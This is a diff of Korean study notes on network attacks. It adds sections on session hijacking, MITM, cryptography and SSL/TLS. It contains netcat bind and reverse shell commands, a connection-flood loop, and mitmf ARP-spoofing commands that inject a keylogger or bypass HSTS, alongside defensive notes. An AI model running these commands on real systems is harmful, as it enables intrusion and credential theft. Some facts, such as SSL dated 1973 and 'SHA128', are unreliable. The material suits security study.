@@ -262,10 +262,10 @@ https://logins.daum.net/accounts/signinform.do
 ### netcat을 이용한 쉘 연결
 * 정방향 연결
     - 희생자 : nc -lvp 4444 -e cmd.exe  (/bin/bash)
-    - 공격자 : nc win7IP 4444
+    - 공격자 : nc <win7IP> 4444
 
 * 역방향 연결(reverse connection, reverse shell)
-    - 희생자 : nc 리눅스IP 4444 -e cmd.exe
+    - 희생자 : nc <리눅스IP 4444> -e cmd.exe
     - 공격자 : nc -lvp 4444 
 
 ### 은닉 채널(Covert Channel)
@@ -416,4 +416,76 @@ while (:); do nc <공격대상ip> 80 & sleep 1;done
 
 ---
 ## 세션 하이재킹, MITM
-* 
+
+### TCP Sesion Hijacking
+* TCP 세션
+    - seq 넘버
+    - ack 넘버
+* 보안대책
+    - 암호화 통신 사용
+    - 패킷의 유실과 재전송 확인
+
+### MITM(Man In The Middle) 공격
+* 글자 그대로 누군가의 사이에 끼어드는 것
+    - 적극적으로 공격, 패킷 변조
+
+#### SSH mitm
+#### SSL mitm
+
+```bash
+$ mitmf -i eth0 --target <target IP> --gateway <gateway IP> --arp --spoof --upsidedownternet
+
+$ mitmf -i eth0 --target 192.168.18.131 --gateway 192.168.18.2 --arp --spoof --upsidedownternet
+
+$ mitmf -i eth0 --target 192.168.18.131 --gateway 192.168.18.2 --arp --spoof --jskeylogger
+```
+---
+## 암호화
+* 일방향 암호화
+    - MD5(x), SHA128(x), SHA256
+* 양방향 암호화
+    - 대칭키
+    - 비대칭키
+
+* 대칭키(비밀키)
+    - DES(x), 3DES(x), AES
+* 비대칭키(공개키, 개인키 방식)
+    - RSA
+    - 인증서가 비대칭키
+    - 공개키가 누구의 것인지 확인 불가
+        + 그래서, 신뢰할 수 있는 인증 기관이 생김 -> SSL
+
+---
+### SSL(Secure Sokcket Layer)
+* 1973, Netscape사에서 개발한 통신 규약
+    - 셰션 계층에서 적용되며 TELNET, FTP, HTTP 등의 프로토콜의 안정성을 보장함
+    - 서버 인증, 클라이언트 인증, 기밀성 보장
+    - 전자상거래 등 많은 곳에서 사용
+* HTTP를 SSL로 암호화 -> HTTPS
+
+#### TLS(Transport Layer Security)
+* SSL 3.0 버전을 IEEF 표준화 기구에서 표준으로 개발
+* SSL 3.0 버전의 업그레이드 버전 TLS1.0
+
+---
+#### SSL MITM
+1. SSL STRIP
+    - 중간에 강제로 HTTPS 통신을 HTTP로 통신하게 만듦
+* HSTS : Client 레벨에서 HTTPS 사용을 강제하는 기법
+    - 최신 브라우저에서 사용됨
+* SSL STRIP+ 
+    - bypass HSTS
+    - 호스트 주소를 바꿔치기해 http로 접속하게 함
+        + www.google.com => wwww.google.com
+        + 호스트 주소가 이상해 https로 접속이 안됨
+    - 현재는 이상한 호스트라도 강제로 https로 접속하게 만듦
+* __문제점__
+    - 유명하지 않은곳은 등록이 안되어 있음
+    - 국내사이트가 등록 안되어 있는 경우가 많음
+
+```bash
+$ mitmf -i eth0 --target 192.168.18.131 --gateway 192.168.18.2 --arp --spoof --hsts
+```
+
+2. SSL 인증서 바꿔치기
+
